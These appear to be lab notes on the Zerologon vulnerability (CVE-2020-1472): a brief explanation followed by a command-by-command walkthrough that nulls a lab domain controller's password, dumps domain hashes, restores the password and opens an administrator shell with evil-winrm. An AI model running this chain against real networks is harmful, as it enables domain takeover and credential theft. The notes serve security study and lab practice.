## Introduction
- This vulnerability allows a hacker to take control of a domain controller (DC), including the root DC. This is done by changing or removing the password for a service account on the controller. The hacker can then simply cause a denial of service or take over and own the entire network.
- Zerologon is the name given to a vulnerability identified in CVE-2020-1472.
- This dangerous vulnerability has a 10 out of 10 (CVSS v3.1) for severity from the Common Vulnerability Scoring System (CVSS).
- This vulnerability exploits a cryptographic flaw in Microsoft’s Active Directory Netlogon Remote Protocol (MS-NRPC).
- The biggest problem with this vulnerability is that MS-NRPC is also used to transmit certain account changes, such as computer service account passwords. However, lack of validation in the source of the request to change these passwords has become a significant security issue.
- Zerologon is a vulnerability in the cryptography of Microsoft’s Netlogon process that allows an attack against Microsoft Active Directory domain controllers.
- Zerologon makes it possible for a hacker to impersonate any computer, including the root domain controller.

## Practical implementation in the lab

1. Install dependencies as follows:
```python
┌──(kali㉿kali)-[/opt/zerologon]
└─$ pip install -r Requirements.txt 
```

2. **Running the tester**
Now that all our requirements are satisfied, we boot up our Windows Server which has already been configured as a Domain Controller.
-  DC Name: HYDRA-DC  
-  IP Address: 192.168.1.15

**Command** -
./zeroLogon-NullPass.py DC-NAME IP-ADDRESS
```python
python3 zerologon_check.py HYDRA-DC 192.168.1.15
```

**Output** - 
![[zerologon1.png]]

3.  Now, to exploit the vulnerability with our newly crafted exploit;
**Command** - 
secretsdump.py -just-dc -no-pass DC-NAME\$@IP-ADDRESS
```python
┌──(kali㉿kali)-[/opt/zerologon]
└─$ python3 cve-2020-1472-exploit.py HYDRA-DC 192.168.1.15
```

**Output** - 
![[zerologon2.png]]
Now that the password has successfully been set to null, or 0; 

4. Now, we can use Impacket's secretsdump.py to dump the hashes;
**Command** - 
```python
┌──(kali㉿kali)-[/opt/zerologon]
└─$ secretsdump.py -just-dc -no-pass MARVEL/HYDRA-DC\$@192.168.1.15
```

**Output** - 
![[zerologon3.png]]
The administrator hash highlighted above is the one that we are going to use in the next step to restore the domain controller password again from empty string.

5. Now, we run the below command to get the administrator plain_hex_password.
**Command** - 
```python
secretsdump.py administrator@192.168.1.15 -hashes administrator_hash
```

**Output** - 
![[zerologon4.png]]

6. Above highlighted plain_hex_password will be used to restore the DC password that is null now.
**Command** - 
```python
┌──(kali㉿kali)-[/opt/zerologon]
└─$ python3 restorepassword.py MARVEL/HYDRA-DC@HYDRA-DC -target-ip 192.168.1.15 -hexpass plain_password_hex
```

**Output** - 
![[zerologon5.png]]

1. We can also generate a Powershell root shell with evil-winrm like;
```python
evil-winrm -u Administrator -H LOCAL-ADMIN-HASH -i IP-ADDRESS
```